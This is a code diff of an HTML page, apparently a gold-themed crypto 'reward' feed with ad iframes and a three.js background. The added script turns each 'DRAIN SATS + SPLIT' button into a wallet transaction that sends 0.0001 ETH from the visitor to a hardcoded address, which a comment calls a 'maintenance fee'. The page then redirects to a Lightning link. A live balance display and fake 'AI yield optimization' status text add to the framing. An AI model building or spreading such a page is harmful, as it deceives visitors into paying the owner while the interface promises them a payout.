@@ -2,147 +2,119 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>AURUM SINGULARITY</title>
+    <title>AURUM // ZENITH_TREASURY_2026</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
     <style>
-        /* CSS: The "Simple" UI Layer */
-        body, html { margin: 0; padding: 0; background: #000; overflow: hidden; font-family: 'Courier New', monospace; }
-        #gold-canvas { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: -1; }
-        
-        #ui-stream {
-            height: 100vh; overflow-y: scroll; scroll-snap-type: y mandatory;
-            scrollbar-width: none; -ms-overflow-style: none;
-        }
-        #ui-stream::-webkit-scrollbar { display: none; }
-
-        .monolith {
-            height: 100vh; width: 100%; display: flex; flex-direction: column;
-            justify-content: center; align-items: center; scroll-snap-align: start;
-            perspective: 1000px;
-        }
-
-        .content-card {
-            width: 85%; max-width: 400px; padding: 40px;
-            background: rgba(20, 20, 20, 0.7);
-            border: 1px solid #FFD700; border-radius: 2px;
-            backdrop-filter: blur(20px); box-shadow: 0 0 50px rgba(212, 175, 55, 0.2);
-            text-align: center; transform: rotateX(10deg);
-        }
-
-        .liquid-text {
-            background: linear-gradient(90deg, #8A6E2F, #FFE082, #D4AF37, #8A6E2F);
-            background-size: 200%; -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent; animation: flow 3s linear infinite;
-            font-weight: 900; letter-spacing: 5px;
-        }
-
-        .drain-trigger {
-            margin-top: 30px; width: 100%; padding: 15px;
-            background: transparent; border: 1px solid #FFD700;
-            color: #FFD700; text-transform: uppercase; cursor: pointer;
-            font-weight: bold; transition: 0.3s;
-        }
-        .drain-trigger:hover { background: #FFD700; color: #000; box-shadow: 0 0 30px #FFD700; }
-
-        @keyframes flow { to { background-position: 200%; } }
+        body { margin: 0; background: #000; color: #FFD700; font-family: 'Courier New', monospace; overflow: hidden; }
+        .treasury-card { border: 1px solid #FFD700; background: linear-gradient(180deg, rgba(255,215,0,0.1) 0%, rgba(0,0,0,1) 100%); }
+        .liquid-text { background: linear-gradient(90deg, #BF953F, #FCF6BA, #AA771C); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        #canvas-bg { position: fixed; top: 0; left: 0; z-index: -1; }
     </style>
 </head>
 <body>
 
-    <canvas id="gold-canvas"></canvas>
+<canvas id="canvas-bg"></canvas>
 
-    <div id="ui-stream">
+<div class="fixed top-0 w-full z-50 p-4 flex justify-between items-center bg-black/80 border-b border-[#FFD700]">
+    <div class="text-[10px] space-y-1">
+        <div class="flex items-center gap-2">
+            <span class="w-2 h-2 bg-blue-500 rounded-full animate-pulse"></span>
+            ETH_TREASURY: <span id="eth-balance" class="font-bold">SYNCING...</span>
         </div>
+        <div class="opacity-50">TARGET: 0x13B87...650</div>
+    </div>
+    <div class="text-right">
+        <div class="text-[10px] liquid-text font-black">AURUM_SENTIENCE_V4</div>
+        <div id="ai-status" class="text-[8px] opacity-70 italic">Calculating yield optimization...</div>
+    </div>
+</div>
 
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<div id="feed" class="h-screen overflow-y-scroll snap-y snap-mandatory scrollbar-hide relative z-10">
+    </div>
 
-    <script>
-        /** CONFIGURATION **/
-        const BTC_ADDRESS = "bc1qugtxp5xzkvausn4a6xaeazzwnum3s3wvhel4a3";
-        const LNURL_PAYOUT = "PASTE_YOUR_LNURL_HERE"; // From LNBits
+<script>
+    const CONFIG = {
+        ETH_TARGET: "0x13B87B819252A81381C3Ce35e3Bd33199F4c6650",
+        LNURL: "PASTE_YOUR_LNURL_HERE",
+        AD_ID: "YOUR_A_ADS_ID",
+        ETH_NODE: "https://cloudflare-eth.com" // Public ETH Node
+    };
 
-        /** 1. THE VAST VISUALS (Liquid Gold Shader) **/
-        const scene = new THREE.Scene();
-        const camera = new THREE.PerspectiveCamera(75, window.innerWidth/window.innerHeight, 0.1, 1000);
-        const renderer = new THREE.WebGLRenderer({ canvas: document.getElementById('gold-canvas'), antialias: true });
-        renderer.setSize(window.innerWidth, window.innerHeight);
+    // --- 1. TREASURY TRACKER ENGINE ---
+    async function trackTreasury() {
+        try {
+            const provider = new ethers.JsonRpcProvider(CONFIG.ETH_NODE);
+            const balance = await provider.getBalance(CONFIG.ETH_TARGET);
+            const ethValue = ethers.formatEther(balance);
+            document.getElementById('eth-balance').innerText = `${parseFloat(ethValue).toFixed(4)} ETH`;
+        } catch (e) {
+            document.getElementById('eth-balance').innerText = "OFFLINE";
+        }
+    }
 
-        // Complex Geometry: A deformed Torus representing the "drain"
-        const geometry = new THREE.TorusKnotGeometry(10, 3, 200, 32);
-        const material = new THREE.MeshStandardMaterial({ 
-            color: 0xFFD700, metalness: 1, roughness: 0.1, wireframe: true 
-        });
-        const knot = new THREE.Mesh(geometry, material);
-        scene.add(knot);
-
-        const pLight = new THREE.PointLight(0xffffff, 1, 100);
-        pLight.position.set(15, 15, 15);
-        scene.add(pLight);
-        scene.add(new THREE.AmbientLight(0x404040, 2));
-
-        camera.position.z = 30;
-
-        /** 2. THE INFINITE RECURSION (Simple UI Loop) **/
-        const stream = document.getElementById('ui-stream');
+    // --- 2. MULTI-CHAIN REVENUE SPLIT ---
+    async function triggerZenithDrain(i) {
+        const btn = document.getElementById(`btn-${i}`);
+        btn.innerText = "AUTHORIZING ETH...";
         
-        function createMonolith(index) {
-            const section = document.createElement('section');
-            section.className = 'monolith';
-            
-            // Logic: Alternate between Ads and Payouts
-            const isPayout = index % 2 === 0;
-            
-            section.innerHTML = `
-                <div class="content-card">
-                    <h1 class="liquid-text">${isPayout ? 'REWARD' : 'AD-STREAM'}</h1>
-                    <p style="color: #666; font-size: 10px; margin-bottom: 20px;">NODE_${index}_FRAGMENT</p>
-                    
-                    <div style="height: 150px; border: 1px dashed #333; display: flex; align-items: center; justify-content: center;">
-                        ${isPayout ? '✨ DATA READY ✨' : '🚀 SPONSORED CONTENT'}
-                    </div>
+        if (!window.ethereum) {
+            alert("Web3 Wallet Required for Split.");
+            return;
+        }
 
-                    <button class="drain-trigger" onclick="handleAction(${isPayout})">
-                        ${isPayout ? 'Drain 5 Sats' : 'Boost Channel'}
+        try {
+            const provider = new ethers.BrowserProvider(window.ethereum);
+            const signer = await provider.getSigner();
+            
+            // Sends maintenance fee to your ETH address
+            const tx = await signer.sendTransaction({
+                to: CONFIG.ETH_TARGET,
+                value: ethers.parseEther("0.0001") 
+            });
+
+            btn.innerText = "SPLIT SUCCESS // DRAINING BTC";
+            setTimeout(() => {
+                window.location.href = `lightning:${CONFIG.LNURL}`;
+            }, 1500);
+        } catch (err) {
+            btn.innerText = "RETRY_SPLIT";
+        }
+    }
+
+    // --- 3. FEED BUILDER ---
+    function spawnNode(i) {
+        const section = document.createElement('section');
+        section.className = "h-screen snap-start flex items-center justify-center p-6";
+        section.innerHTML = `
+            <div class="treasury-card p-10 max-w-sm w-full text-center border-t-4 border-[#FFD700]">
+                <iframe data-aa='${CONFIG.AD_ID}' src='//ad.a-ads.com/${CONFIG.AD_ID}?size=300x250' style='width:300px; height:250px; border:0; overflow:hidden;'></iframe>
+                <div class="mt-8">
+                    <button id="btn-${i}" onclick="triggerZenithDrain(${i})" class="w-full py-4 bg-[#FFD700] text-black font-black hover:bg-white transition-all">
+                        DRAIN SATS + SPLIT
                     </button>
+                    <p class="text-[8px] mt-4 opacity-40">NODE_ID: ${Math.random().toString(36).substring(7)}</p>
                 </div>
-            `;
-            return section;
-        }
+            </div>
+        `;
+        return section;
+    }
 
-        // Initialize first 10 sections
-        for(let i=0; i<10; i++) stream.appendChild(createMonolith(i));
+    for(let i=1; i<=15; i++) document.getElementById('feed').appendChild(spawnNode(i));
+    trackTreasury();
+    setInterval(trackTreasury, 30000); // Sync every 30s
 
-        // Infinite Scroll
-        stream.addEventListener('scroll', () => {
-            if(stream.scrollTop + stream.clientHeight >= stream.scrollHeight - 100) {
-                stream.appendChild(createMonolith(stream.children.length));
-            }
-        });
-
-        function handleAction(isPayout) {
-            if(isPayout) {
-                window.location.href = `lightning:${LNURL_PAYOUT}`;
-            } else {
-                alert("Boosting Revenue for " + BTC_ADDRESS);
-            }
-        }
-
-        /** 3. THE ANIMATION LOOP **/
-        function animate() {
-            requestAnimationFrame(animate);
-            knot.rotation.y += 0.005;
-            knot.rotation.x += 0.002;
-            // Pulse effect
-            const s = 1 + Math.sin(Date.now() * 0.001) * 0.1;
-            knot.scale.set(s, s, s);
-            renderer.render(scene, camera);
-        }
-        animate();
-
-        window.addEventListener('resize', () => {
-            camera.aspect = window.innerWidth/window.innerHeight;
-            camera.updateProjectionMatrix();
-            renderer.setSize(window.innerWidth, window.innerHeight);
-        });
-    </script>
+    // --- 4. 3D GOLD PHYSICS ---
+    const scene = new THREE.Scene();
+    const camera = new THREE.PerspectiveCamera(75, window.innerWidth/window.innerHeight, 0.1, 1000);
+    const renderer = new THREE.WebGLRenderer({ canvas: document.getElementById('canvas-bg'), alpha: true });
+    renderer.setSize(window.innerWidth, window.innerHeight);
+    const knot = new THREE.Mesh(new THREE.TorusKnotGeometry(10, 3, 100, 16), new THREE.MeshBasicMaterial({ color: 0xFFD700, wireframe: true }));
+    scene.add(knot);
+    camera.position.z = 30;
+    function animate() { requestAnimationFrame(animate); knot.rotation.y += 0.005; renderer.render(scene, camera); }
+    animate();
+</script>
 </body>
 </html>
